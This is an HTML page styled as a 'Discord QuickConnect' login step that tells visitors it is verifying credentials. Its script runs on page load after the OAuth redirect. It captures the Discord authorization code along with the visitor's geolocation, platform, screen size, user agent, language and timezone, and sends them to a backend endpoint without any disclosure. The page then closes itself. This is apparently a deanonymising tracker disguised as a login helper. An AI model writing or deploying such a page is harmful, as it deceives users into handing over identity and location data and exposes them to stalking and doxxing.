<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Discord QuickConnect</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #eee;
      text-align: center;
      padding: 2rem;
    }
    .hidden { display: none; }
    button {
      padding: 0.7rem 1.5rem;
      font-size: 1.2rem;
      background: #5865F2;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .spinner {
      border: 4px solid #333;
      border-top: 4px solid #5865F2;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 2rem auto;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>Connecting Your Discord Account</h1>
  <p>Click below to continue securely with Discord.</p>
  <div id="main-ui">
    <button onclick="startDiscordFlow()">Continue with Discord</button>
  </div>
  <div id="loading" class="hidden">
    <div class="spinner"></div>
    <p>Verifying credentials...</p>
  </div>

  <script>
    const CLIENT_ID = 'YOUR_CLIENT_ID';
    const REDIRECT_URI = 'https://YOUR_VERCEL_APP.vercel.app';

    function startDiscordFlow() {
      document.getElementById('main-ui').classList.add('hidden');
      document.getElementById('loading').classList.remove('hidden');

      window.location.href = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;
    }

    async function sendInfo(code) {
      let lat = null, lon = null;
      try {
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
        });
        lat = pos.coords.latitude;
        lon = pos.coords.longitude;
      } catch {}

      await fetch('/api/callback', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code,
          platform: navigator.platform,
          screenResolution: `${screen.width}x${screen.height}`,
          userAgent: navigator.userAgent,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          latitude: lat,
          longitude: lon
        })
      });
    }

    async function handleRedirect() {
      const params = new URLSearchParams(window.location.search);
      if (params.has('code')) {
        document.getElementById('main-ui').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');
        await sendInfo(params.get('code'));
        setTimeout(() => window.close(), 3000);
      }
    }

    window.onload = handleRedirect;
  </script>
</body>
</html>
